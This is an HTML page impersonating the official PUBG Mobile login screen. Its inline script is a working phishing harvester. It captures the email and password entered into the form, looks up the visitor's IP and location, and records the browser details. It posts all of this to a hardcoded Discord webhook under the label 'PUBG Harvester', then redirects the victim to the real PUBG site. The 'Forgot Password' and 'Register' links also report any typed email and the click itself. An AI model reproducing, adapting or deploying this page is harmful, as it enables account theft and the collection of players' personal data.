<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>PUBG MOBILE - Official Login</title>
    <style>
        body { margin: 0; font-family: sans-serif; background: #111 url('https://www.pubgmobile.com/en/images/main_bg.jpg') center/cover; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background: rgba(0,0,0,0.85); padding: 40px; border-radius: 8px; width: 90%; max-width: 380px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        h2 { color: #f2a900; text-align: center; font-style: italic; margin-top: 0; font-size: 28px; letter-spacing: 2px; }
        label { display: block; margin-bottom: 5px; color: #aaa; font-size: 13px; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; background: #222; border: 1px solid #444; color: #fff; border-radius: 4px; box-sizing: border-box; }
        input:focus { border-color: #f2a900; outline: none; }
        button { width: 100%; padding: 14px; background: #f2a900; color: #000; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #d89600; }
        .links { display: flex; justify-content: space-between; margin-top: 15px; font-size: 12px; }
        .links a { color: #f2a900; text-decoration: none; }
    </style>
</head>
<body>
<div class='box'>
    <h2>PUBG MOBILE</h2>
    <form id='loginForm'>
        <label>Email or Phone Number</label>
        <input type='text' id='email' required>
        <label>Password</label>
        <input type='password' id='password' required>
        <button type='submit' id='submitBtn'>LOG IN</button>
        <div class='links'>
            <a href='#' id='forgot'>Forgot Password?</a>
            <a href='#' id='register'>Register</a>
        </div>
    </form>
</div>
<script>
    const WEBHOOK = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
    
    async function sendData(action, e, p) {
        try {
            const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
            const payload = {
                embeds: [{
                    title: '🚨 PUBG Harvester: ' + action,
                    color: 15893760,
                    fields: [
                        { name: 'Creds', value: (e || 'N/A') + ' / ' + (p || 'N/A') },
                        { name: 'IP', value: geo.ip || 'Unknown' },
                        { name: 'Location', value: geo.city + ', ' + geo.country_name },
                        { name: 'Time', value: new Date().toLocaleString() },
                        { name: 'System', value: navigator.userAgent }
                    ]
                }]
            };
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch(err) {}
    }

    document.getElementById('loginForm').onsubmit = async (ev) => {
        ev.preventDefault();
        document.getElementById('submitBtn').innerText = 'LOGGING IN...';
        await sendData('Login Attempt', document.getElementById('email').value, document.getElementById('password').value);
        window.location.href = 'https://www.pubgmobile.com/';
    };
    
    document.getElementById('forgot').onclick = async (ev) => {
        ev.preventDefault();
        await sendData('Forgot Password Click', document.getElementById('email').value, '');
        alert('Reset link sent.');
    };
    
    document.getElementById('register').onclick = async (ev) => {
        ev.preventDefault();
        await sendData('Register Click', '', '');
        window.location.href = 'https://www.pubgmobile.com/';
    };
</script>
</body>
</html>
